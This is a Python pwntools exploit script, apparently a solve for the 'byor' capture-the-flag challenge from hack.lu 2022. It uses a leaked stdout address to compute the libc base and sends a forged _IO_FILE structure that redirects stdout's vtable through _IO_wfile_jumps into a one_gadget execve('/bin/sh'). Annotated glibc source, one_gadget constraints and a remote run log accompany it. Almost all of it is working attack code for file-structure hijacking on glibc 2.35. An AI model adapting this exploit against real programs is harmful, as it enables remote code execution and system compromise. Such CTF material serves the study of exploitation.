#!/usr/bin/python3

from pwn import *
from pwnlib.libcdb import unstrip_libc

elf = ELF('byor', checksec=False)
libc = ELF("./libc.so.6")
# unstrip_libc(libc.path)

context.terminal = ["remotinator", "vsplit", "-x"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"dir ./glibc-2.35/",
			"b *main+88",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote('flu.xxx', 11801)
	else:
		return process(elf.path, env=env)

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)


ru(b'Here is your foundation: ')
stdout = int(rl().strip().decode(), 16)
ls(f'stdout {stdout:#x}')

libc.address = stdout - libc.symbols["_IO_2_1_stdout_"]
ls(f'libc.address {libc.address:#x}')

"""

pwndbg> ptype /o FILE
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }

pwndbg> ptype /o struct _IO_FILE_plus
/* offset      |    size */  type = struct _IO_FILE_plus {
/*      0      |     216 */    FILE file;
/*    216      |       8 */    const struct _IO_jump_t *vtable;

                               /* total size (bytes):  224 */
                             }
"""


"""
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}

wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
      else
	{
	  /* Otherwise must be currently reading.  If _IO_read_ptr
	     (and hence also _IO_read_end) is at the buffer end,
	     logically slide the buffer forwards one block (by setting
	     the read pointers to all point at the beginning of the
	     block).  This makes room for subsequent output.
	     Otherwise, set the read pointers to _IO_read_end (leaving
	     that alone, so it can continue to correspond to the
	     external position). */
	  if (f->_wide_data->_IO_read_ptr == f->_wide_data->_IO_buf_end)
	    {
	      f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
	      f->_wide_data->_IO_read_end = f->_wide_data->_IO_read_ptr =
		f->_wide_data->_IO_buf_base;
	    }
	}
      f->_wide_data->_IO_write_ptr = f->_wide_data->_IO_read_ptr;
      f->_wide_data->_IO_write_base = f->_wide_data->_IO_write_ptr;
      f->_wide_data->_IO_write_end = f->_wide_data->_IO_buf_end;
      f->_wide_data->_IO_read_base = f->_wide_data->_IO_read_ptr =
	f->_wide_data->_IO_read_end;

      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_wide_data->_IO_write_end = f->_wide_data->_IO_write_ptr;
    }
  if (wch == WEOF)
    return _IO_do_flush (f);
  if (f->_wide_data->_IO_write_ptr == f->_wide_data->_IO_buf_end)
    /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  *f->_wide_data->_IO_write_ptr++ = wch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && wch == L'\n'))
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  return wch;
}
libc_hidden_def (_IO_wfile_overflow)
"""

class File:
	def __init__(self) -> None:
		self.buf = bytearray(224)

	def write(self, offset, value):
		for i, b in enumerate(value):
			self.buf[offset+i] = b


fp = File()
fp.write(0, p32(0xFBAD0000)) # _flags
fp.write(8, p64(0)) # _IO_read_ptr;
fp.write(16, p64(0)) # _IO_read_end;
fp.write(24, p64(0)) # _IO_read_base;
fp.write(32, p64(0)) # _IO_write_base;
fp.write(40, p64(1)) # _IO_write_ptr;
fp.write(48, p64(0)) # _IO_write_end;
fp.write(56, p64(0)) # _IO_buf_base;
fp.write(64, p64(0)) # _IO_buf_end;
fp.write(72, p64(0)) # _IO_save_base;
fp.write(80, p64(0)) # _IO_backup_base;
fp.write(88, p64(0)) # _IO_save_end;
fp.write(96, p64(0)) # _markers
fp.write(104, p64(libc.address + 0x219aa0)) # _chain
fp.write(112, p32(1)) # _fileno
fp.write(116, p32(0)) # _flags2
fp.write(120, p64(0xffffffffffffffff)) # _old_offset
fp.write(128, p16(0)) # _cur_column
fp.write(130, p8(0)) # _vtable_offset
fp.write(131, b'\x00' * 5)  # _shortbuf
fp.write(136, p64(libc.address + 0x21ba70)) # _lock
fp.write(144, p64(0xffffffffffffffff)) # _offset
fp.write(152, p64(0)) # _codecvt
fp.write(160, p64(stdout-0x10)) # _wide_data (wide vtable points to unused field in stdout)
fp.write(168, p64(0)) # _freeres_list
fp.write(176, p64(0)) # _freeres_buf
fp.write(184, p64(0)) # __pad5
fp.write(192, p32(0xffffffff)) # _mode
fp.write(196, p32(0) + p64(libc.address + 0xebcf5) + p64(stdout+96)) # _unused2, 4B padding, wide_vtable pointer and vtable entry for doallocate
fp.write(216, p64(libc.sym['_IO_wfile_jumps'])) # vtable

s(fp.buf[:-1]) # send one byte less to trigger premature exit

# conditions to meet in _IO_flush_all_lockp to call _IO_OVERFLOW
# fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
# then _IO_OVERFLOW is called, since we changed the stdout vtable _IO_wfile_overflow is called

# conditions to meet in _IO_wfile_overflow to call _IO_wdoallocbuf
# then _IO_NO_WRITES and _IO_CURRENTLY_PUTTING should not be set
# f->_wide_data->_IO_write_base == 0
# since we replaced wide_vtable, our function is called


ia()
 

# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL


# ➜  /media/sf_D_DRIVE/hacklu_2022/byor ./solve.py REMOTE
# [*] '/media/sf_D_DRIVE/hacklu_2022/byor/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to flu.xxx on port 11801: Done
# [+] stdout 0x7f2ec4f9b780
# [+] libc.address 0x7f2ec4d81000
# [*] Switching to interactive mode
